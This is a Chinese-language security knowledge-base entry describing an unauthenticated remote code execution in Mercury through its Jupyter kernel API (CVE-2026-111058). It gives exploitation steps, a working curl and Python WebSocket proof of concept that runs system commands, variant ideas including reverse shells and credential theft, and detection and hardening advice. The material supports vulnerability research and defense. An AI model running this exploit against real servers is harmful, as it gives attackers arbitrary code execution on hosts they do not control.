---
id: web-python-framework-mercury-unauth-jupyter-kernel-rce
title: Mercury 未授权 Jupyter Kernel API 导致 RCE
type: scenario
domain: web
path: web/python/framework
technique: unauth-jupyter-kernel-execute
tags:
- python
- mercury
- jupyter
- kernel
- websocket
- rce
- unauth
cve:
- CVE-2026-111058
severity: critical
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-04'
affected_versions: 3.2.4 及以下
verification:
  verified_by: verifier-C
  verified_at: '2026-11-04T19:08:48+08:00'
  notes: 已对照原文与8张图核对：CVE-2026-111058、3.2.4 及以下、默认无 Token、POST /api/kernels、WebSocket channels + execute_request、id/whoami/uname/cat /etc/passwd 回显均一致；Jupyter 消息信封为按协议补全，原文未公开脚本全文
url: /docs/web/python/framework/web-python-framework-mercury-unauth-jupyter-kernel-rce/
draft: false
kb_aliases:
- Mercury RCE
- CVE-2026-111058
- Jupyter kernel 未授权
- /api/kernels RCE
---

## 一句话结论

Mercury 在默认配置、未强制 Token 鉴权时，`/api/kernels` 可被未授权调用创建 Jupyter 内核，再通过 `/api/kernels/<id>/channels` WebSocket 发送 `execute_request`，即可在服务器上执行任意 Python 代码与系统命令。

## 原理

- Mercury 把 Jupyter Notebook 包装成 Web 应用，其内核管理沿用 Jupyter Server 的 REST + WebSocket 协议。
- 默认启动且未配置 token 时，`POST /api/kernels` 不校验身份，直接返回 `kernel_id`，相当于把“创建代码执行环境”的能力开放给任意访问者。
- 内核创建后，Jupyter 通过 WebSocket `/api/kernels/<kernel_id>/channels` 收发消息；客户端发送 `execute_request`，内核在目标主机上执行 `content.code` 并回传结果。
- 代码在内核进程中执行，权限继承 Mercury 服务进程；若服务以高权限用户运行，攻击者直接获得同等权限。
- 启动日志提示 “Kernel is running over TCP without encryption”，说明内核通信未加密，进一步降低利用门槛（可被嗅探/劫持）。

## 触发条件

- Mercury 以默认配置启动，未设置 `--token` 或等价鉴权。
- 服务端口（默认 8888）可从攻击者位置访问，且未由反向代理/防火墙限制来源。
- `/api/kernels` 未做额外访问控制，允许匿名 POST。
- 目标内核类型存在且可启动（默认 `python3`）。

## 利用步骤

1. 访问首页确认无需登录即可进入应用面板。
2. `POST /api/kernels`，body `{"name":"python3"}`，不带 Cookie/Token，拿到 `id`。
3. 连接 `ws://target:8888/api/kernels/<id>/channels`。
4. 发送 `execute_request` 消息，`code` 填 `__import__('os').popen('id').read()`。
5. 从 `execute_result`/`stream` 消息读取命令输出；可继续执行 `whoami`、`uname -a`、读文件、反弹 shell。

## PoC

```bash
# 1. 未授权创建 kernel
curl -X POST http://target:8888/api/kernels \
  -H "Content-Type: application/json" \
  -d '{"name": "python3"}'
# -> {"id":"8adcb1c3-...","name":"python3","execution_state":"starting",...}
```

```python
# 2. 通过 WebSocket 发送 execute_request（Jupyter 消息信封）
import json, websocket
ws = websocket.create_connection("ws://target:8888/api/kernels/<KERNEL_ID>/channels")
msg = {
    "header": {
        "msg_id": "1", "username": "", "session": "s",
        "msg_type": "execute_request", "version": "5.3"
    },
    "parent_header": {}, "metadata": {},
    "content": {
        "code": "__import__('os').popen('id').read()",
        "silent": False, "store_history": True,
        "user_expressions": {}, "allow_stdin": False,
        "stop_on_error": True
    },
    "channel": "shell"
}
ws.send(json.dumps(msg))
print(ws.recv())  # 读取 execute_result / stream
```

## 变体与关联

- 变体：同一套 Jupyter 协议适用于未加固的 Jupyter Notebook/Lab 部署；只要 kernel API 可达且无鉴权，手法一致。
- 变体：不创建新 kernel，直接枚举 `/api/kernels` 复用已有 kernel；或通过 `/api/sessions` 等相邻接口扩大影响。
- 变体：`code` 可换成 `subprocess`、`os.system`、反弹 shell、下载执行等；也可读取环境变量中的凭据。
- 关联：Mercury 的 “kernel over TCP without encryption” 与 Jupyter 默认无 TLS 的部署风险叠加。

## 检测与防御

- 检测：未携带认证信息的 `POST /api/kernels`；短时间内创建大量 kernel；WebSocket 连接 `/api/kernels/*/channels`。
- 检测：`execute_request` 中出现 `os.popen`、`subprocess`、`__import__('os')`、`/etc/passwd`、反弹 shell 等特征。
- 检测：Mercury 进程异常派生子进程、向外连接；默认 8888 端口对公网暴露。
- 修复：生产环境强制 Token/密码鉴权，拒绝匿名 API；升级到修复版本。
- 加固：服务只绑定 127.0.0.1，前置反向代理做认证与来源限制；容器化运行并降低权限；内核通信启用加密（IPC/CurveZMQ 或 TLS）。
- 注意：仅隐藏首页不等于修复，`/api/kernels` 仍可能直接可达，必须验证 API 层鉴权。
